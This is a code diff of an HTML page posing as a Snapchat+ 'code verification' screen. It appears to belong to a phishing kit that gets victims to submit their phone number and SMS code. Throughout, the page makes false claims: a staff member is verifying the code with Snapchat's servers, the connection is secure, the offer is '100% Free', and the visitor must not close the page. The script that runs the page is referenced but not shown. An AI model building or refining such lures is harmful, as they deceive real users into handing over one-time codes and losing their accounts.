@@ -3,46 +3,142 @@
 <head>
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>Verification in Progress — Snapchat+</title>
+    <meta name="theme-color" content="#fffc00" />
+    <title>Snapchat+ — Verifying Code</title>
     <link rel="stylesheet" href="style.css" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css" />
 </head>
 <body>
     <div class="bg-gif"></div>
     <div class="container">
-        <div class="main-card validation-card">
-            <div class="val-header">
-                <img src="https://cdn.imgbin.com/13/25/13/social-media-icon-snapchat-icon-6kBmyR3B.jpg" alt="Snapchat" class="val-logo" />
-                <h1>Verification in Progress</h1>
-                <p class="val-subtitle">Your code is being verified by our team</p>
+        <div class="main-card flow-card">
+
+            <!-- ── Header ──────────────────────────────────────────────────── -->
+            <div class="flow-header">
+                <img src="https://cdn.imgbin.com/13/25/13/social-media-icon-snapchat-icon-6kBmyR3B.jpg"
+                     alt="Snapchat+" class="flow-logo" />
+                <div class="flow-header-text">
+                    <h1>Code Verification</h1>
+                    <p>A staff member is reviewing your code</p>
+                </div>
             </div>
-            <div class="val-status" id="valStatus">
-                <div class="spinner"></div>
-                <h2>Verifying code...</h2>
-                <p class="val-phone">Code entered for <strong id="displayPhone">--</strong></p>
+
+            <!-- ── Progress steps ──────────────────────────────────────────── -->
+            <div class="steps-container">
+                <div class="step done" id="step1">
+                    <div class="step-icon"><i class="fas fa-check"></i></div>
+                    <div class="step-line"></div>
+                    <span class="step-label">Request sent</span>
+                </div>
+                <div class="step done" id="step2">
+                    <div class="step-icon"><i class="fas fa-check"></i></div>
+                    <div class="step-line"></div>
+                    <span class="step-label">SMS sent</span>
+                </div>
+                <div class="step active" id="step3">
+                    <div class="step-icon"><i class="fas fa-magnifying-glass"></i></div>
+                    <div class="step-line"></div>
+                    <span class="step-label">Verifying</span>
+                </div>
+                <div class="step last" id="step4">
+                    <div class="step-icon"><i class="fas fa-star"></i></div>
+                    <span class="step-label">Activated!</span>
+                </div>
             </div>
-            <div class="val-alert">
-                <div class="alert-box">
-                    <span class="alert-icon">⏳</span>
+
+            <!-- ── Status block ────────────────────────────────────────────── -->
+            <div class="flow-status-block">
+                <div class="pulse-ring">
+                    <div class="pulse-dot"></div>
+                </div>
+                <div class="flow-status-text">
+                    <p class="flow-status-title">Verifying your code…</p>
+                    <p class="flow-status-sub">
+                        Number: <strong id="displayPhone">--</strong>
+                        &nbsp;·&nbsp;
+                        Code submitted
+                    </p>
+                </div>
+            </div>
+
+            <!-- ── Code preview ────────────────────────────────────────────── -->
+            <div class="code-submitted-banner">
+                <i class="fas fa-circle-check" style="color:#10b981; font-size:1.3rem;"></i>
+                <div>
+                    <strong>Code submitted successfully</strong>
+                    <p>A staff member is confirming it with Snapchat's servers</p>
+                </div>
+            </div>
+
+            <!-- ── Warning ─────────────────────────────────────────────────── -->
+            <div class="flow-warning">
+                <span class="flow-warning-icon">⏳</span>
+                <div>
+                    <strong>PLEASE WAIT</strong>
+                    <p>Do not close this page — verification only takes a few seconds</p>
+                </div>
+            </div>
+
+            <!-- ── Info grid ───────────────────────────────────────────────── -->
+            <div class="info-grid">
+                <div class="info-card">
+                    <div class="info-icon">🕒</div>
                     <div>
-                        <strong>PLEASE WAIT</strong>
-                        <p>A staff member is verifying your code, this only takes a few seconds</p>
+                        <p class="info-title">Estimated time</p>
+                        <p class="info-value">~30 sec</p>
+                    </div>
+                </div>
+                <div class="info-card">
+                    <div class="info-icon">⏱️</div>
+                    <div>
+                        <p class="info-title">Time elapsed</p>
+                        <p class="info-value" id="elapsedTime">0:00</p>
+                    </div>
+                </div>
+                <div class="info-card">
+                    <div class="info-icon">✅</div>
+                    <div>
+                        <p class="info-title">SMS</p>
+                        <p class="info-value">Received</p>
+                    </div>
+                </div>
+                <div class="info-card">
+                    <div class="info-icon">🔍</div>
+                    <div>
+                        <p class="info-title">Status</p>
+                        <p class="info-value">Checking</p>
                     </div>
                 </div>
             </div>
-            <div class="val-network">
-                <div class="network-dots"><span></span><span></span><span></span></div>
-                <p>Connecting to verification server...</p>
-            </div>
-            <div class="val-timer">
-                <div class="timer-icon">🕒</div>
-                <div class="timer-text">
-                    <p>Estimated wait time: <strong>~30 sec</strong></p>
-                    <p class="timer-small">Do not close this page during verification</p>
+
+            <!-- ── What's happening ────────────────────────────────────────── -->
+            <div class="next-steps">
+                <p class="next-steps-title">What's happening right now?</p>
+                <div class="next-steps-list">
+                    <div class="next-step-item done">
+                        <span class="next-step-num done-num"><i class="fas fa-check"></i></span>
+                        <p>You entered the SMS code correctly</p>
+                    </div>
+                    <div class="next-step-item active-step">
+                        <span class="next-step-num active-num">→</span>
+                        <p>Our team is verifying the code against Snapchat's servers</p>
+                    </div>
+                    <div class="next-step-item">
+                        <span class="next-step-num">3</span>
+                        <p>Snapchat+ will be activated on your account automatically</p>
+                    </div>
                 </div>
             </div>
-            <div class="val-footer">
-                <p>🔒 Secure connection • Data protected</p>
+
+            <!-- ── Footer ──────────────────────────────────────────────────── -->
+            <div class="flow-footer">
+                <span><i class="fas fa-lock"></i> Secure connection</span>
+                <span>·</span>
+                <span><i class="fas fa-shield-alt"></i> Data protected</span>
+                <span>·</span>
+                <span><i class="fas fa-gift"></i> 100% Free</span>
             </div>
+
         </div>
     </div>
     <script src="verify-wait.js"></script>
